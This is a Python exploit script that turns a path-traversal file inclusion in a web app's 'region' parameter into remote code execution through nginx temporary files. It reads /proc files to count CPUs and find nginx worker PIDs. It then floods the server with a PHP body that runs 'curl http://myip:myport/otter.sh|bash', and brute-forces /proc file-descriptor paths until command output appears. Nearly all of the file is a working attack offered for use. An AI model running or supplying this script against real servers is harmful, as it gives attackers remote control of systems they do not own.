#!/usr/bin/python3

"""
author: otter ʕ •ᴥ•ʔ

based on https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files

This script 
"""

import threading
import requests


# set up url and requests
URL = 'http://website.com/admin/'

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "SOMECOOKIE=somevalue",
}

# payload to request `/proc/cpuinfo`
data = {"region": "../../../../../../proc/cpuinfo", "debug": "true"}

print("[+] Reading /proc/cpuinfo")

r = requests.post(URL, headers=headers, data=data)

# count number of CPUs
cpus = r.text.count('processor')

print("[+] Reading /proc/sys/kernel/pid_max")

# payload to request `/proc/sys/kernel/pid_max`
data = {"region": "../../../../../../proc/sys/kernel/pid_max", "debug": "true"}

r = requests.post(URL, headers=headers, data=data)

# get max PID on target host to use in the bruteforce range
pid_max = int(r.text)

print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    data = {"region": "../../../../../../proc/" +
            str(pid) + "/cmdline", "debug": "true"}
    r = requests.post(URL, headers=headers, data=data)

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')
        nginx_workers.append(pid)

        if len(nginx_workers) >= cpus:
            break
done = False


# function to upload an php file that downloads and executes a script
def uploader():
    print('[+] starting uploader')

    while not done:
        requests.get(
            URL, data='<?php system("curl http://myip:myport/otter.sh|bash"); /*' + 16 * 1024 * 'A')


# executes the `uploader` function concurrently with 16 threads
# the number of threads can be customized
for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()


# bruteforce all the nginx worker PIDs found
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')

        for fd in range(4, 32):
            data = {"region": "../../../../../../proc/self/fd/" +
                    str(pid) + "/../../../" + str(pid) + "/fd/" + str(fd) + "", "debug": "true"}
            r = requests.post(URL, headers=headers, data=data)
            if "uid=" in r.text:
                print(r.text)
                exit()


for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
